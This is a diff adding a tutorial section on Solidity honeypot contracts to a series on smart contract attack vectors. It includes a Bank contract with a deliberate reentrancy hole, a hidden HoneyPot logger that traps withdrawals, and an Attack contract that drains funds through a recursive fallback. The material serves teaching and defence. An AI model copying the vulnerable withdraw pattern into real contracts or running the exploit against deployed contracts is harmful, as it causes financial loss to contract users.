@@ -566,4 +566,103 @@ Since miners look for the transactions with the highest gas fee, Bob's transacti
 ### Preventive Technique
 Use LibSubmarine, which is an open-source smart contract library that makes it easy to protect your contract against front-runners by temporarily hiding transactions on-chain and reveal it at a later stage.
 
+## SOLIDITY ATTACK VECTORS #8 - Honeypot
+A honeypot is a smart contract that purports to leak cash to an arbitrary user due to a clear vulnerability in its code in exchange for extra payments from that user. A honeypot is a trap to catch hackers.
+
+Combining two exploits, reentrancy and hiding malicious code, we can build a contract that will catch malicious users.
+
+Honeypots in smart contract can be divided into 3 main categories depending on the used techniques:
+
+1. EVM based smart contract honeypots
+2. Solidity compiler-based smart contract honeypots
+3. Etherscan based smart contract honeypots
+
+In this article, we will be focusing on the third category, Etherscan based smart contract honeypots, based on hiding things from the users.
+
+The reentrancy hack is a bait to catch the attacker. The owner of the contract deploys the _HoneyPot_ contract, and use the address of the HoneyPot in place of the logger while deploying the _Bank_ contract. So the attacker will see the _Bank_ and _Logger_ contract on etherscan, and will not see the _HoneyPot_ contract.
+
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+contract Bank {
+    mapping(address => uint) public balances;
+    Logger logger;
+
+    constructor(Logger _logger) {
+        logger = Logger(_logger);
+    }
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+        logger.log(msg.sender, msg.value, "Deposit");
+    }
+
+    function withdraw(uint _amount) public {
+        require(_amount <= balances[msg.sender], "Insufficient funds");
+
+        (bool sent, ) = msg.sender.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] -= _amount;
+
+        logger.log(msg.sender, _amount, "Withdraw");
+    }
+}
+
+contract Logger {
+    event Log(address caller, uint amount, string action);
+
+    function log(address _caller, uint _amount, string memory _action) public {
+        emit Log(_caller, _amount, _action);
+    }
+}
+
+// Let's assume this code is in a separate file so that others cannot read it.
+contract HoneyPot {
+    function log(address _caller, uint _amount, string memory _action) public {
+        if (equal(_action, "Withdraw")) {
+            revert("It's a trap");
+        }
+    }
+
+    function equal(string memory _a, string memory _b) public pure returns (bool) {
+        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
+    }
+}
+```
+
+
+On seeing the reentrancy hack in the Bank contract, the attacker deploys the _Attack_ contract with the address of the _Bank_. When the attacker calls the _withdraw()_ function, the Attack contract starts withdrawing ether from the Bank contract. When the withdrawal transaction is about to complete, it calls _logger.log()_. _Logger.log()_ calls _HoneyPot.log()_ and reverts, then transaction fails.
+
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+contract Attack {
+    Bank bank;
+
+    constructor(Bank _bank) {
+        bank = Bank(_bank);
+    }
+
+    fallback() external payable {
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw(1 ether);
+        }
+    }
+
+    function attack() public payable {
+        bank.deposit{value: 1 ether}();
+        bank.withdraw(1 ether);
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
 
